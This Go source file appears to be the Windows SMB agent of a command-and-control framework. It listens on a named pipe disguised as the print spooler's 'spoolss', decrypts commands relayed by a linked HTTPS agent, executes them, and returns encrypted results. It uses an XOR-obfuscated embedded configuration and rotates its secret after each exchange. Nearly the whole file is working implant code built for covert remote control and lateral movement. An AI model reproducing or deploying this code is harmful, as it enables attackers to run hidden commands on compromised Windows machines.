// server/docker/payloads/SMB_Windows/main.go
// SMB-based Windows agent that communicates via named pipes

//go:build windows
// +build windows

package main

import (
	"encoding/json"
	"log"
	"os"
	"os/signal"
	"syscall"
	"time"
)

// Configuration variables - will be replaced at compile time via -ldflags
var (
	// XOR key for decrypting embedded values (same pattern as HTTPS agent)
	xorKey = ""

	// Embedded encrypted configuration blob (XOR encrypted with decrypted secret)
	encryptedConfig = ""

	// Initial client ID from build
	clientID = ""

	// Current sleep interval (seconds) and jitter (percentage)
	sleep  = "30"
	jitter = "10"

	// Secret for encryption (XOR encrypted with xorKey, decrypted at runtime)
	secret = ""

	// Pipe name for the named pipe listener
	pipeName = "spoolss"

	// Debug mode
	debugMode = "false"
)

// Global managers
var (
	pipeListener  *PipeListener
	commandQueue  *CommandQueue
	resultManager *ResultManager
	secureComms   *SecureComms
)

func main() {
	if debugMode == "true" {
		log.SetFlags(log.LstdFlags | log.Lshortfile)
		log.SetPrefix("[SMB Agent] ")
	} else {
		// Minimal logging in production
		log.SetOutput(os.Stderr)
		log.SetPrefix("")
		log.SetFlags(0)
	}

	logDebug("Starting...")

	// Decrypt embedded configuration
	config, err := decryptConfig(encryptedConfig)
	if err != nil {
		logDebug("Failed to decrypt config: %v", err)
		os.Exit(1)
	}

	logDebug("Configuration loaded")

	// Initialize command queue and result manager
	commandQueue = NewCommandQueue()
	resultManager = NewResultManager()

	// Create the named pipe listener using the global pipeName variable
	// (set via ldflags during build, defaults to "spoolss")
	activePipeName := pipeName
	if configPipe, ok := config["Pipe Name"]; ok && configPipe != "" {
		activePipeName = configPipe // Override with config if present
	}

	pipeListener, err = NewPipeListener(activePipeName)
	if err != nil {
		logDebug("Failed to create pipe listener: %v", err)
		os.Exit(1)
	}

	logDebug("Listening on pipe: %s", pipeListener.GetPipePath())

	// Handle shutdown gracefully
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-sigChan
		logDebug("Shutdown signal received")
		pipeListener.Close()
		os.Exit(0)
	}()

	// Main loop - wait for connections from HTTPS agents
	for {
		conn, err := pipeListener.Accept()
		if err != nil {
			logDebug("Accept error: %v", err)
			time.Sleep(time.Second)
			continue
		}

		logDebug("New connection from HTTPS agent")

		// Handle connection in a goroutine
		go handleConnection(conn, config)
	}
}

func handleConnection(conn *PipeConnection, config map[string]string) {
	defer func() {
		conn.Close()
		logDebug("Connection closed")
	}()

	// Perform authentication with the connecting HTTPS agent
	if err := performAuth(conn); err != nil {
		logDebug("Authentication failed: %v", err)
		return
	}

	logDebug("Authentication successful")

	// Always perform handshake for each new connection
	// Even if we already have clientID/keys, the connecting HTTPS agent needs
	// to receive our handshake data to complete the link
	if err := performHandshake(conn, config); err != nil {
		logDebug("Handshake failed: %v", err)
		return
	}
	logDebug("Handshake complete, clientID=%s", clientID)

	// Main message loop
	log.Printf("[SMB] Entering main message loop")
	for {
		// Read message from HTTPS agent
		log.Printf("[SMB] Waiting to read message from pipe...")
		message, err := conn.ReadMessage()
		if err != nil {
			log.Printf("[SMB] Read error: %v", err)
			logDebug("Read error: %v", err)
			return
		}

		log.Printf("[SMB] Received message, length=%d", len(message))

		// Parse message type
		var msgEnvelope struct {
			Type    string `json:"type"`
			Payload string `json:"payload"`
		}
		if err := json.Unmarshal(message, &msgEnvelope); err != nil {
			log.Printf("[SMB] Invalid message format: %v", err)
			logDebug("Invalid message format: %v", err)
			continue
		}

		log.Printf("[SMB] Message type: %s", msgEnvelope.Type)

		switch msgEnvelope.Type {
		case "data":
			// Commands from server
			log.Printf("[SMB] Processing data message (commands)")
			handleServerData(conn, msgEnvelope.Payload)

		case "handshake_response":
			// Response to our handshake - handled separately
			log.Printf("[SMB] Received handshake_response in main loop (unexpected)")
			handleHandshakeResponse(conn, msgEnvelope.Payload)

		case "disconnect":
			log.Printf("[SMB] Disconnect requested")
			logDebug("Disconnect requested")
			return

		default:
			log.Printf("[SMB] Unknown message type: %s", msgEnvelope.Type)
			logDebug("Unknown message type: %s", msgEnvelope.Type)
		}
	}
}

func handleServerData(conn *PipeConnection, encryptedPayload string) {
	log.Printf("[SMB] handleServerData called, payload length=%d", len(encryptedPayload))

	if secureComms == nil {
		log.Printf("[SMB] SecureComms not initialized!")
		logDebug("SecureComms not initialized")
		return
	}

	// Decrypt the payload
	log.Printf("[SMB] Decrypting payload...")
	decrypted, err := secureComms.DecryptMessage(encryptedPayload)
	if err != nil {
		log.Printf("[SMB] Failed to decrypt payload: %v", err)
		logDebug("Failed to decrypt payload: %v", err)
		return
	}

	log.Printf("[SMB] Decrypted payload: %s", decrypted)

	// Add commands to queue
	if err := commandQueue.AddCommands(decrypted); err != nil {
		log.Printf("[SMB] Failed to add commands: %v", err)
		logDebug("Failed to add commands: %v", err)
		return
	}

	log.Printf("[SMB] Commands added to queue, processing...")

	// Process commands
	processedCount := 0
	for {
		result, err := commandQueue.ProcessNextCommand()
		if err != nil {
			log.Printf("[SMB] Error processing command: %v", err)
			continue
		}
		if result == nil {
			break
		}

		processedCount++
		log.Printf("[SMB] Processed command %d: %s, exit_code=%d", processedCount, result.Command.Command, result.ExitCode)

		// Add result to manager
		resultManager.AddResult(result)
	}

	log.Printf("[SMB] Processed %d commands, checking for results to send", processedCount)

	// Send results back
	if resultManager.HasResults() {
		results := resultManager.GetPendingResults()
		log.Printf("[SMB] Sending %d results back to HTTPS agent", len(results))

		payload := map[string]interface{}{
			"agent_id": clientID,
			"results":  results,
		}

		jsonData, err := json.Marshal(payload)
		if err != nil {
			log.Printf("[SMB] Failed to marshal results: %v", err)
			logDebug("Failed to marshal results: %v", err)
			return
		}

		// Encrypt with our secret
		encrypted, err := secureComms.EncryptMessage(string(jsonData))
		if err != nil {
			log.Printf("[SMB] Failed to encrypt results: %v", err)
			logDebug("Failed to encrypt results: %v", err)
			return
		}

		// Send back through pipe
		response := map[string]string{
			"type":    "data",
			"payload": encrypted,
		}
		respJSON, _ := json.Marshal(response)
		log.Printf("[SMB] Sending response back through pipe, length=%d", len(respJSON))
		if err := conn.WriteMessage(respJSON); err != nil {
			log.Printf("[SMB] Failed to send results: %v", err)
			logDebug("Failed to send results: %v", err)
		} else {
			log.Printf("[SMB] Successfully sent results back")
		}

		// Rotate secret
		secureComms.RotateSecret()
		log.Printf("[SMB] Secret rotated")
	} else {
		log.Printf("[SMB] No results to send")
	}
}

func handleHandshakeResponse(conn *PipeConnection, payload string) {
	// This is called when we receive a handshake response from the server
	// The actual handling is done in the handshake.go performHandshake flow
	logDebug("Received handshake response")
}

func logDebug(format string, v ...interface{}) {
	if debugMode == "true" {
		log.Printf(format, v...)
	}
}
